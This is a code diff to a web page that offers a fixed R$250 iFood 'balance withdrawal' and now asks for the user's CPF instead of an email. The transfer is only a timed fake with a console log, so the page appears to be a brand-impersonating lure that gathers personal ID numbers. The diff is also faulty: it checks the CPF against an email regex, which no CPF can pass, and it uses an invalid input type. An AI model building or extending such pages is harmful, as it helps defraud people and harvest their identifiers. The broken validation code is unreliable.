@@ -672,9 +672,9 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="ifood-email">Email cadastrado no iFood</label>
-                    <input type="email" id="ifood-email" name="ifood-email" class="form-input"
-                        placeholder="seu-email@exemplo.com" required>
+                    <label class="form-label" for="ifood-cpf">CPF cadastrado no iFood</label>
+                    <input type="CPF" id="ifood-cpf" name="ifood-cpf" class="form-input"
+                        placeholder="123.456.789-00" required>
                 </div>
 
                 <button type="submit" class="withdraw-btn" id="withdraw-btn">
@@ -932,7 +932,7 @@
                 e.preventDefault();
 
                 const amount = 250.00; // Valor fixo
-                const ifoodEmail = document.getElementById('ifood-email').value.trim();
+                const ifoodcpf = document.getElementById('ifood-cpf').value.trim();
 
                 // Validações
                 if (amount > currentBalance) {
@@ -940,15 +940,15 @@
                     return;
                 }
 
-                if (!ifoodEmail) {
-                    showError('Por favor, insira seu email cadastrado no iFood');
+                if (!ifoodcpf) {
+                    showError('Por favor, insira seu cpf cadastrado no iFood');
                     return;
                 }
 
-                // Validação de email
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                if (!emailRegex.test(ifoodEmail)) {
-                    showError('Por favor, insira um email válido');
+                // Validação de cpf
+                const cpfRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!cpfRegex.test(ifoodcpf)) {
+                    showError('Por favor, insira um cpf válido');
                     return;
                 }
 
@@ -957,7 +957,7 @@
             });
         });
 
-        function processWithdraw(amount, email) {
+        function processWithdraw(amount, cpf) {
             const btn = document.getElementById('withdraw-btn');
             btn.textContent = 'Processando...';
             btn.disabled = true;
@@ -980,7 +980,7 @@
                 btn.disabled = false;
 
                 // Log para debug (opcional)
-                console.log(`Transferência processada: R$ ${amount.toFixed(2)} para ${email}`);
+                console.log(`Transferência processada: R$ ${amount.toFixed(2)} para ${cpf}`);
 
             }, 2000);
         }
